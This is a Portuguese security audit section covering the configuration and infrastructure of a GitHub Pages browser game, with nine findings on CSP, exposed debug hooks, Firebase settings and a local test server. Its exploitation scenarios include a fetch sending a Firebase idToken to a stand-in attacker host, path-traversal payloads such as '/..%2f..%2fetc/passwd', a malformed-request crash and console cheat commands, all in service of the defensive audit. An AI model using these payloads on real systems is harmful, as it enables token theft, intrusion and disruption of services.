# Auditoria de segurança — 09. Configuração e infraestrutura

Revisão: branch `security-hardening`, `index.html` em `7bb7797` (8565 linhas); `origin/main` em `5ee0def`. Leitura em 02/10/2026. **Verificado** = constatado no código, no `git` ou na API do GitHub (`gh api`, conta `caiobholanda`). **Não verificado** = depende do console do Firebase/Metered ou de permissão de administrador no repositório (a API devolveu 403/404).

Como o jogo é servido (verificado em `gh api repos/costamaiavitor/tiroteio/pages`): GitHub Pages com `build_type: legacy` (Jekyll), `source: main` na raiz `/`, `https_enforced: true`, repositório **público** com forks permitidos. O Pages não deixa configurar cabeçalhos HTTP: a única forma de política é `<meta http-equiv>` dentro do `index.html`. Hoje o `<head>` (l. 3–9) só tem `charset` e `viewport`.

### [F1] Sem Content-Security-Policy e sem Referrer-Policy

- Arquivo e linha: `index.html` l. 3–9 (nenhum `<meta http-equiv>`). Origens que a página usa (grep de `https://`, `wss://`, `blob:`, `data:` e leitura das bibliotecas):
  - `https://unpkg.com` — PeerJS (l. 274); `https://cdn.jsdelivr.net` — PeerJS de reserva por `document.write` (l. 275), three.js pelo importmap (l. 276, inclusive `three/addons/`), glTF da mão VR do `@webxr-input-profiles` (l. 3559, baixado por `fetch` do `GLTFLoader` → `connect-src`);
  - `https://www.gstatic.com` — Firebase por `import()` dinâmico (l. 8174–8175: `firebase-app`, `firebase-auth`, `firebase-firestore`);
  - `https://fonts.googleapis.com` (CSS, l. 8–9) e `https://fonts.gstatic.com` (arquivos da fonte Rajdhani);
  - `data:` (favicon l. 7, `toDataURL` l. 8362), `blob:` (Worker l. 8490; miniaturas de skins l. 8361; texturas embutidas nos `.glb`);
  - em tempo de execução: `https://0.peerjs.com` e `wss://0.peerjs.com` (PeerJS pede id por HTTPS e sinaliza por WebSocket); `https://identitytoolkit.googleapis.com`, `https://securetoken.googleapis.com`, `https://firestore.googleapis.com` (Firebase Auth/Firestore); `https://tiroteio-237ee.firebaseapp.com` (`signInWithPopup`, l. 8211: abre o popup `__/auth/handler` e **embute um iframe** `__/auth/iframe` → `frame-src`); `https://apis.google.com` (o `firebase-auth` carrega o `gapi` **no documento pai** para conversar com esse iframe → `script-src`);
  - STUN/TURN (l. 5047–5050) e os canais WebRTC não passam pela CSP.
- Descrição: sem CSP, qualquer injeção de script (XSS numa mensagem de rede, CDN comprometida, extensão maliciosa) roda sem limite e pode falar com qualquer servidor; sem `Referrer-Policy`, o endereço com `?sala=CODIGO` (l. 8448) pode sair no `Referer` para fontes, CDNs e Google (os navegadores atuais já cortam a query por padrão em `strict-origin-when-cross-origin`, mas isso não é garantido por versão nem por configuração do usuário).
- Cenário de exploração: um script injetado por outro achado (ex.: os de 06-rede/10-integridade) chama `fetch('https://atacante.example/?t=' + idToken)` com o token do Firebase, ou carrega um `<script>` de domínio próprio; a CSP abaixo bloquearia as duas coisas. Com `Referer` cheio, um terceiro recebe o código da sala e entra sem convite.
- Severidade: Média
- Correção sugerida (**testar antes de ativar**: o Pages não aceita `Content-Security-Policy-Report-Only`, então ativar numa branch, abrir o console e procurar "Refused to…", rodar `pnpm test`, entrar com Google, salvar progresso, criar sala com dois navegadores e abrir a mão VR). Colocar logo depois de `<meta charset="utf-8">`, antes de qualquer `<link>`, numa linha só:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'none'; object-src 'none'; form-action 'none'; script-src 'self' 'unsafe-inline' https://unpkg.com https://cdn.jsdelivr.net https://www.gstatic.com https://apis.google.com; worker-src blob:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' https://cdn.jsdelivr.net https://unpkg.com https://www.gstatic.com https://0.peerjs.com wss://0.peerjs.com https://identitytoolkit.googleapis.com https://securetoken.googleapis.com https://firestore.googleapis.com wss://firestore.googleapis.com https://www.googleapis.com https://tiroteio-237ee.firebaseapp.com; frame-src https://tiroteio-237ee.firebaseapp.com https://accounts.google.com">
<meta name="referrer" content="strict-origin-when-cross-origin">
```

  Notas da política:
  - `script-src 'unsafe-inline'` é obrigatório hoje: há três scripts inline (l. 275 clássico, l. 276 importmap, l. 421 módulo com ~8 100 linhas). A alternativa por **hash** (`'sha256-…'` de cada um dos três, sem `'unsafe-inline'`) é mais forte, pois bloqueia script injetado, mas o hash do módulo muda a cada edição do jogo e não há build; só vale a pena com um script que recalcule os três hashes e reescreva a meta antes do commit (ex.: `tools/csp-hash.mjs` + hook de pre-commit). Não há atributos `on*=` nem `javascript:` no HTML (verificado), então os hashes não precisariam de `'unsafe-hashes'`. Recomendação: fase 1 com `'unsafe-inline'` (já limita **para onde** o código fala e **de onde** carrega), fase 2 com hashes.
  - `style-src 'unsafe-inline'`: 41 atributos `style="` e um `<style>` inline (l. 10); atribuições `el.style.x = …` não são afetadas pela CSP.
  - `worker-src blob:` cobre o Worker de fundo (l. 8490). `img-src blob:` cobre as miniaturas (l. 8361) e as texturas dos `.glb`.
  - `wss://firestore.googleapis.com` e `https://www.googleapis.com` são por precaução (o SDK 10.12 usa WebChannel por HTTPS); se o console não acusar uso, podem sair.
  - Se o App Check for ativado (F7), acrescentar `https://www.google.com https://www.gstatic.com` em `script-src`/`frame-src` (reCAPTCHA) e `https://firebaseappcheck.googleapis.com` em `connect-src`.
  - A meta **não** aceita `frame-ancestors`, `report-uri`/`report-to` nem `sandbox`. Contra clickjacking (o jogo pode ser emoldurado por qualquer site), opcionalmente `if (top !== self) top.location = location;` no início do módulo.
  - Nos testes (`http://127.0.0.1:porta`), `'self'` passa a ser essa origem; o PeerJS já é bloqueado por `ctx.route`, o resto continua igual.

### [F2] Ganchos de depuração `window.__T`, `__simLock` e `__simNow` expostos em produção

- Arquivo e linha: `index.html` l. 8560–8562 (`window.__T = { S, C, me, G, R, NET, W, MAPS, … srvBuy, srvStartMatch, broadcast, … grantAllSkins, PROF, … zHit, zStartRound, zSpawnOne, zHp, zHurt, … sim() }`), l. 5088, 8492 e 8502 (`window.__simLock` / `window.__simNow` lidos pelo laço principal e pelo Worker). Usados por `tests/_jogo.mjs` (l. 20, 32, 38) e `tools/vmtest.js` (l. 5), sempre em `127.0.0.1`/`localhost`.
- Descrição: o objeto entrega, pelo console de qualquer jogador em `costamaiavitor.github.io`, o estado do servidor (`S`, `Z`), o perfil (`PROF`), funções do host (`broadcast`, `srvBuy`, `zHp`, `zHurt`), `grantAllSkins()` e um relógio travável (`sim`, `__simLock`). Como todo o código já roda no cliente, isso não cria um poder novo (quem quiser altera o código), mas reduz o esforço de trapaça a uma linha e deixa documentado no próprio jogo o caminho para fazê-lo. O código já tem um precedente de detecção de ambiente local em `ARMS_VER` (l. 3699, só `localhost`, sem `127.0.0.1`).
- Cenário de exploração: no console, `__T.grantAllSkins()` ou `__T.PROF.data.xp = 1e9` seguido de uma mudança de skin grava o perfil no Firestore (cliente é a autoridade, ver 07-dados-banco); sendo host, `__T.broadcast({t:'msg', …})`, `__T.zHp(...)`, `__T.sim(600)` (avança 10 minutos de simulação para todos) ou `window.__simLock = true` (congela a partida de toda a sala).
- Severidade: Média (facilitador; a proteção real é a autoridade do servidor/regras do Firestore, tratada em 05/07/10)
- Correção sugerida: um único flag de ambiente, usado nos quatro pontos, sem parâmetro de URL (um `?debug` em produção devolveria o acesso a quem souber do parâmetro; os testes já rodam em `127.0.0.1`, então não precisam dele):

```js
// perto de CFG (l. ~450)
const DEBUG = ['localhost', '127.0.0.1', '[::1]'].includes(location.hostname); // testes e ferramentas locais

// l. 3699
const ARMS_VER = DEBUG ? Date.now() : 6;
// l. 5088
const arr = DEBUG && window.__simLock ? now : performance.now() / 1000;
// l. 8492 e 8502
if (!inGame || performance.now() - lastFrameAt < 200 || (DEBUG && window.__simLock)) { … }
if (DEBUG && window.__simLock) now = window.__simNow ?? now; else tick(dt);
// l. 8560
if (DEBUG) window.__T = { … };
```

  `tests/_jogo.mjs` continua funcionando (serve em `127.0.0.1`, `tests/servidor.mjs` l. 23). Se um dia for preciso depurar em produção, preferir um build local servido em `localhost` a reabrir o gancho.

### [F3] PeerJS com `debug: 1`

- Arquivo e linha: `index.html` l. 5155 (`new Peer(PEER_PREFIX + code, { config: ICE, debug: 1 })`) e l. 5194.
- Descrição: nível 1 do PeerJS imprime **só erros** no console (nível 2 = avisos, 3 = tudo, inclusive mensagens). Os erros incluem o id do peer (`tiroteio-br-v1-CODIGO`), que o próprio jogador já conhece. Nenhum segredo (as credenciais TURN de `ICE` não são impressas por esse nível).
- Cenário de exploração: nenhum prático; informação de diagnóstico para quem já está no próprio navegador.
- Severidade: Baixa
- Correção sugerida: manter 1 em produção (ajuda a apoiar jogadores com problema de ligação) ou amarrar ao flag de F2: `debug: DEBUG ? 2 : 1`. Não usar 3 fora do local: ele imprime o conteúdo das mensagens, inclusive o chat.

### [F4] Logs no console: só `console.warn`, sem dados sensíveis

- Arquivo e linha: `index.html` — 13 ocorrências, todas `console.warn` (l. 3337, 3565, 3720, 3910, 4263, 5064, 5166, 5180, 5209, 5211, 8167, 8180, 8199). Nenhum `console.log`, `console.error`, `console.info` ou `console.debug` (verificado por grep).
- Descrição: imprimem o objeto de exceção de falhas de carregamento de modelos 3D ("mão 3D não carregou", "braços 3D não carregaram", "fps", "faca"), do canal rápido, do PeerJS (`peer error`, `conn`) e do Firebase (`firebase`, `salvar conta`, `ler conta`). Os erros do Firebase podem trazer `customData.email` em alguns códigos (`auth/account-exists-with-different-credential`), mas isso é o e-mail do próprio usuário no próprio console. Sem tokens, senhas ou credenciais. A interface mostra `e.code || e.message` (l. 8167, 8199), o que é adequado.
- Cenário de exploração: nenhum; o console só é visível para quem está no navegador.
- Severidade: Baixa (sem achado real; registrado para completar a área)
- Correção sugerida: nada obrigatório. Se quiser reduzir ruído, em produção imprimir `e.code || e.message` e, com o `DEBUG` de F2, o objeto inteiro.

### [F5] Pastas de desenvolvimento e documentos da auditoria publicados pelo GitHub Pages

- Arquivo e linha: `.gitignore` de `origin/main` tem só `_sk/` (a branch acrescenta `node_modules/`); `git ls-tree origin/main` publica, além de `index.html`, `assets/` e `README.md`: `tools/skview.js`, `tools/vmtest.js`, `tools/wfit.js`, 27 arquivos em `tools/blender/*.py` e `tools/blender/pipeline.sh`. Caminhos absolutos da máquina do autor em `tools/blender/fit.py` l. 1 (`C:\Users\Costa\Claude\blender-tools\pose_test.py`), `export.py` l. 7 (`C:\Users\Costa\Claude\tiroteio\assets\arms.glb`), `anim.py` l. 13, `anim2.py` l. 15, `fitgrip.py` l. 4 e 56, `frames.py` l. 8, `trym.py` l. 21; `pipeline.sh` l. 5 tem o caminho do Blender (genérico). Nesta branch entram ainda `tests/`, `package.json`, `pnpm-lock.yaml` e `docs/seguranca/**` — e `docs/seguranca/auditoria/01-segredos.md` **repete os valores** da credencial TURN e da `apiKey` (2 ocorrências, verificado por grep).
- Descrição: o build `legacy` do Pages (Jekyll) publica tudo o que está na `main`, menos o que começa com `_` ou `.` e `node_modules`. Logo `https://costamaiavitor.github.io/tiroteio/tools/blender/export.py` já é público hoje e, ao mesclar esta branch sem filtro, `…/tiroteio/docs/seguranca/auditoria/01-segredos.md` e `mapa_sistema.md` também serão: um roteiro das vulnerabilidades em aberto, com números de linha, servido ao lado do jogo. Os `.py` revelam o nome de usuário do desenvolvedor (`Costa`) e a árvore de pastas local; não há segredo neles (verificado: nenhum e-mail, token ou chave em `tools/`). O `tools/blender/recv.py` citado nos comentários não existe no repositório nem no histórico (`git log --all`), ver F9.
- Cenário de exploração: reconhecimento. Quem quiser explorar o jogo lê a auditoria publicada e os valores de credencial repetidos nela (os de `index.html` já são públicos, então não é vazamento novo, mas após a rotação pedida em 01-segredos o documento seguiria mostrando os antigos e o hábito de repetir valores levaria os novos para o mesmo lugar).
- Severidade: Média (pelo conteúdo da auditoria e pelo .gitignore mínimo); Baixa para `tools/` isoladamente
- Correção sugerida:
  1. Limitar o que o Pages publica. Opção simples, sem mudar o fluxo: `_config.yml` na raiz com `exclude: [tools, tests, docs, package.json, pnpm-lock.yaml, README.md, CLAUDE.md]` (o Jekyll do build legacy respeita `exclude`). Opção mais robusta: Pages por Actions (`build_type: workflow`) com `actions/upload-pages-artifact` enviando só `index.html` e `assets/` — isso também abre caminho para o F6.
  2. Nunca escrever o valor de uma credencial em `docs/`: em 01-segredos substituir por prefixo (`7e5e…`) e referência à linha. Se a pasta `docs/seguranca` for mesclada, mantê-la fora da publicação (item 1) ou num repositório privado.
  3. Nos `.py`, trocar os caminhos absolutos por `os.path.join(os.path.dirname(__file__), …)`; `pipeline.sh` já aceita `BLENDER=` por ambiente.
  4. `.gitignore` na `main`: `_sk/`, `node_modules/`, `*.blend`, `*.blend1`, `.env`, `test-results/`.

### [F6] `main` sem proteção publica direto em produção; sem Dependabot, CodeQL nem workflows

- Arquivo e linha: repositório `costamaiavitor/tiroteio` (verificado em 02/10/2026 com `gh api`):
  - `branches/main/protection` → **404** (sem proteção, ou a conta usada não tem permissão de ver: o 404 do GitHub vale para os dois casos); `rulesets` → `[]` (verificado: nenhum ruleset, essa chamada é pública);
  - `pages` → `source.branch: main`, `path: /`, `build_type: legacy`; `actions/workflows` → só o dinâmico `pages-build-deployment` (nenhum `.github/` no repositório: `contents/.github` → 404);
  - `vulnerability-alerts` (Dependabot) → 404 e `code-scanning/default-setup` → 403: **não verificado** (precisa de administrador); `security_and_analysis: null` na leitura pública.
  - Histórico com três identidades que fazem push na `main` (66 commits `costamaiavitor`, 27 `Claude`, 10 `caiobholanda`), ou seja, ao menos um fluxo automatizado com permissão de escrita.
- Descrição: qualquer push na `main` vira, em segundos, o jogo que todos os jogadores carregam, junto com a `FIREBASE_CONFIG` e o acesso ao Firestore deles. Não há revisão obrigatória, proibição de force-push/exclusão, nem varredura de segredos ou de código. Como as dependências vêm por CDN sem lockfile (08-dependencias), o Dependabot não teria o que ler hoje, mas os alertas de segredo (secret scanning + push protection, grátis em repositório público) teriam pegado as credenciais de 01-segredos.
- Cenário de exploração: um token de acesso vazado (de qualquer uma das três identidades, inclusive o do agente automatizado) ou um PR mal revisado faz force-push na `main`; o Pages publica um `index.html` que rouba o `idToken` do Firebase ou injeta um host trapaceiro em todas as salas. Sem proteção, também não há como impedir que o histórico seja reescrito e o incidente apagado.
- Severidade: Média
- Correção sugerida (ações manuais do dono do repositório, todas em Settings):
  1. **Rules → Rulesets → New branch ruleset** para `main`: *Restrict deletions*, *Block force pushes*, *Require a pull request before merging* (1 aprovação; para um projeto de duas pessoas, ao menos *Require linear history* + bloqueio de force-push), *Require status checks* quando houver CI.
  2. **Security → Code security**: ativar *Dependabot alerts*, *Secret scanning* e *Push protection*; *CodeQL default setup* (JavaScript/Python). Público = gratuito.
  3. Criar `.github/workflows/ci.yml` rodando `pnpm install --frozen-lockfile && pnpm test` em PR (os testes já existem nesta branch) e, de preferência, o deploy do Pages por Actions com artefato só de `index.html` + `assets/` (ver F5), passando `build_type` para `workflow` e o ambiente `github-pages` com *Required reviewers*.
  4. Revisar em **Settings → Collaborators** e nos tokens pessoais (fine-grained, com prazo) quem tem `contents: write`; trocar o push direto do fluxo automatizado por PR.

### [F7] Firebase: domínios autorizados, App Check e restrição da `apiKey` (ações manuais no console)

- Arquivo e linha: `index.html` l. 8129–8135 (`FIREBASE_CONFIG` do projeto `tiroteio-237ee`, `authDomain: tiroteio-237ee.firebaseapp.com`), l. 8175 (importa só `firebase-app`, `firebase-auth`, `firebase-firestore`: **nenhum `firebase-app-check`**, verificado), l. 8201–8203 (mensagem `auth/unauthorized-domain` já tratada), `README.md` l. 134 (instrução de adicionar `costamaiavitor.github.io` aos domínios autorizados; `localhost` vem por padrão), l. 138–146 (regras do Firestore) e l. 151 ("a `apiKey` não é segredo").
- Descrição: o que depende do console do Firebase/Google Cloud **não foi verificado** (sem acesso): (a) se os domínios autorizados são só `costamaiavitor.github.io` e `localhost` (o `127.0.0.1` dos testes não é necessário, pois eles não fazem login); (b) se a `apiKey` do navegador tem restrição de referenciador HTTP e de APIs; (c) se o App Check está ativado. O código mostra que o cliente **não inicializa o App Check**, portanto ou ele está desligado ou está em modo "não aplicar"; se fosse aplicado hoje, Auth e Firestore recusariam o jogo. Sem App Check e sem restrição da chave, qualquer script fora do site (um `node` com o SDK) usa o projeto: cria contas de e-mail/senha sem limite, consome cota do Firestore e, com o `uid` próprio, grava o que quiser em `players/{uid}` (07-dados-banco). A observação do README está certa (a chave identifica o projeto), mas a restrição por referenciador reduz o abuso casual, e o App Check é a única barreira para clientes que não são o jogo.
- Cenário de exploração: script externo com `signInAnonymously`/`createUserWithEmailAndPassword` em laço esgota a cota diária de Auth/Firestore do plano Spark (negação de serviço do sistema de contas) ou cadastra milhares de contas-lixo; nenhum domínio é exigido porque a chamada não vem de navegador.
- Severidade: Média
- Correção sugerida (manual; registrar no README o que foi feito):
  1. **Authentication → Settings → Authorized domains**: manter só `costamaiavitor.github.io` e `localhost`; remover o que não for usado.
  2. **Google Cloud → APIs e serviços → Credenciais → chave "Browser key (auto created by Firebase)"**: *Restrições de aplicativo: Referenciadores HTTP* `https://costamaiavitor.github.io/*`, `http://localhost:*/*`, `http://127.0.0.1:*/*`; *Restrições de API*: Identity Toolkit API, Token Service API, Cloud Firestore API, Firebase Installations API. Testar login e salvamento depois (o `signInWithPopup` passa pelo `authDomain`, que é do próprio Firebase e continua funcionando).
  3. **App Check** com reCAPTCHA v3 (ou Enterprise): registrar o app web, adicionar `import(base + 'firebase-app-check.js')` e `initializeAppCheck(app, { provider: new ReCaptchaV3Provider('<site key>'), isTokenAutoRefreshEnabled: true })` logo depois de `initializeApp` (l. 8176), rodar primeiro em modo "monitorar", depois "aplicar" em Auth e Firestore. Ajustar a CSP (F1) com `https://www.google.com`, `https://www.gstatic.com` (`script-src`, `frame-src`) e `https://firebaseappcheck.googleapis.com` (`connect-src`). Nos testes locais, usar um *debug token* do App Check em `localhost`.
  4. **Authentication → Settings → User actions**: ativar *Email enumeration protection* e, se o cadastro por e-mail não for necessário, desativar o provedor E-mail/senha (decisão do dono, ver 02-autenticacao).

### [F8] `tests/servidor.mjs`: travessia de diretório bloqueada; `decodeURIComponent` sem tratamento derruba o processo e a raiz inteira do repositório é servida

- Arquivo e linha: `tests/servidor.mjs` l. 14–17 (`new URL(req.url, 'http://x')` → `decodeURIComponent(url.pathname)` → `path.resolve(RAIZ, '.' + rel)` → `if (!abs.startsWith(RAIZ + path.sep) && abs !== RAIZ) 403`), l. 23 (`listen(porta, '127.0.0.1')`).
- Descrição (verificado por leitura, caso a caso):
  - `/../x`, `/a/../../x`: o parser WHATWG já normaliza os `..` no `pathname`; o que sobra é resolvido e comparado com `RAIZ + sep` → 403.
  - `/..%2f..%2fetc/passwd`, `/%2e%2e/x`: o `decodeURIComponent` roda **antes** do `resolve`, então vira `../..` real e cai no 403. Correto, porque a comparação é feita no caminho final.
  - Decodificação dupla (`/%252e%252e/x`): decodifica uma vez para `%2e%2e/x`, o `path.resolve` não decodifica, procura um arquivo literalmente chamado `%2e%2e` → 404. Não há segunda decodificação.
  - `\` no Windows: `/..\..\x` — o parser de URL troca `\` por `/` em esquemas especiais (`http`) e normaliza → não sai da raiz; `/..%5c..%5cx` → vira `..\..\x`, que o `path.win32.resolve` trata como separador → fora da raiz → 403. No Linux `\` é caractere de nome → 404.
  - Caso de letra de unidade (`/C:/Windows/win.ini`): `path.resolve(RAIZ, './C:/Windows/win.ini')` concatena como caminho relativo (`RAIZ\C:\Windows\…`) → 404. `path.sep` no `startsWith` evita o prefixo parcial (`C:\dev\tiroteio-seguranca2`).
  - Falhas reais: (1) `decodeURIComponent('/%')` e sequências inválidas (`/%E0%A4%A`) lançam `URIError` dentro do handler; sem `try/catch` o Node derruba o **processo** (o `node --test` inteiro cai com uma única requisição mal formada). (2) Sem lista de bloqueio, qualquer arquivo da raiz é servido: `/.git` (aqui é o ponteiro do worktree; num clone normal `/.git/config` com o remoto e eventuais credenciais embutidas), `/node_modules/…`, `/_sk/…`, `/package.json`. O servidor só escuta em `127.0.0.1` e não envia `Access-Control-Allow-Origin`, então uma página de terceiros no mesmo navegador não consegue **ler** a resposta; o risco se limita a processos locais e à própria aba de teste.
- Cenário de exploração: só em desenvolvimento, com o servidor de testes no ar: uma aba maliciosa aberta no mesmo computador faz `fetch('http://127.0.0.1:8765/%')` em modo `no-cors` e derruba a bateria de testes; um processo local lê `.git/config`.
- Severidade: Baixa
- Correção sugerida:

```js
let rel;
try { rel = decodeURIComponent(url.pathname); } catch { res.writeHead(400); return res.end(); }
if (rel.endsWith('/')) rel += 'index.html';
if (/(^|\/)(\.|node_modules|_sk|tests|tools|docs)(\/|$)/.test(rel)) { res.writeHead(404); return res.end(); } // nada de ponto-arquivos nem pastas de dev
```

  Manter `listen` em `127.0.0.1` e `cache-control: no-store`. Se um dia for exposto na rede local (`0.0.0.0`) para testar em celular, acrescentar uma lista explícita de extensões servidas (`index.html` e `assets/*.glb`).

### [F9] Receptor local de imagens `recv.py` ausente; ferramentas enviam para `127.0.0.1:8799` com nome vindo do chamador

- Arquivo e linha: `tools/skview.js` l. 2 e 37, `tools/vmtest.js` l. 3, 6 e 32, `tools/wfit.js` l. 3, 101 e 115 (`fetch('http://127.0.0.1:8799/' + name + '.png', { method: 'POST', body })`); os comentários apontam para `tools/blender/recv.py`, que **não existe** no repositório nem em nenhum commit (`git log --all --name-only`, verificado; só dois commits mencionam o nome em texto).
- Descrição: o receptor fica fora do controle de versão, então não dá para verificar se ele grava o arquivo com o nome tirado do caminho da URL sem `basename` (um `name` como `../../x` ou `..%2f` gravaria fora da pasta de saída), se escuta só em `127.0.0.1` e se responde `Access-Control-Allow-Origin: *` (necessário para o `fetch` da aba do jogo em `localhost` chegar a `127.0.0.1:8799`, origem diferente — e que, se for `*`, deixa qualquer site aberto no navegador gravar PNGs na máquina enquanto o receptor estiver rodando). As três ferramentas só rodam quando alguém as importa no console (`import('./tools/vmtest.js')`), em sessão local, e dependem de `window.__T` (F2).
- Cenário de exploração: só com o receptor em execução na máquina do desenvolvedor: um site aberto no mesmo navegador faz `POST http://127.0.0.1:8799/../../Users/<nome>/Desktop/x.png` e escreve um arquivo fora da pasta esperada (se não houver `basename`).
- Severidade: Baixa (não verificado: arquivo ausente)
- Correção sugerida: versionar o `recv.py` (ou apagar as referências) e, nele: `nome = os.path.basename(urllib.parse.unquote(path))`, aceitar só `[A-Za-z0-9_-]+\.png`, gravar numa pasta fixa (`tools/out/`), `HTTPServer(('127.0.0.1', 8799), …)`, `Access-Control-Allow-Origin` restrito a `http://localhost:<porta>` do servidor de testes e limite de tamanho do corpo (ex.: 20 MB). Nas três ferramentas, validar `name` com a mesma expressão antes do `fetch`.

## Verificações sem achado

- Nenhum atributo `on*=`, `javascript:` ou `srcdoc` no HTML (facilita a CSP por hash no futuro). Nenhum `eval`/`new Function` no `index.html` (o `new Function` de `tests/_jogo.mjs` l. 38 é só do harness).
- `innerHTML` com dados de rede passa por `esc()` (l. 7762, 7767, 7777); fora do escopo desta área, ver 10-integridade-cliente.
- `location.href = location.pathname` (l. 8480) só recarrega a própria página, sem parâmetro de terceiros.
- Jekyll ignora `_sk/` e `node_modules/` na publicação; o nome `_sk` parece escolhido por isso. O conteúdo da pasta não está no repositório (verificado em `git ls-files`).

## Resumo

| Id | Severidade | Título | Verificação |
|---|---|---|---|
| F1 | Média | Sem Content-Security-Policy nem Referrer-Policy (proposta de CSP: testar antes de ativar) | verificado (código) |
| F2 | Média | `window.__T`, `__simLock`, `__simNow` expostos em produção | verificado (código) |
| F3 | Baixa | PeerJS `debug: 1` (só erros) | verificado (código) |
| F4 | Baixa | Logs: 13 `console.warn`, sem dados sensíveis | verificado (código) |
| F5 | Média | `tools/`, `tests/`, `docs/seguranca` (com credenciais repetidas em 01-segredos) publicados pelo Pages; `.gitignore` mínimo | verificado (git + API Pages) |
| F6 | Média | `main` sem proteção publica direto; sem Dependabot/CodeQL/workflows | rulesets e Pages verificados; proteção, Dependabot e CodeQL **não verificados** (403/404) |
| F7 | Média | Firebase: domínios autorizados, App Check ausente, `apiKey` sem restrição | ausência do App Check no cliente verificada; o resto **não verificado** (console) |
| F8 | Baixa | `tests/servidor.mjs`: traversal bloqueado; `decodeURIComponent` derruba o processo; serve a raiz inteira | verificado (código) |
| F9 | Baixa | `recv.py` ausente; ferramentas enviam PNG com nome do chamador para `127.0.0.1:8799` | **não verificado** (arquivo ausente) |

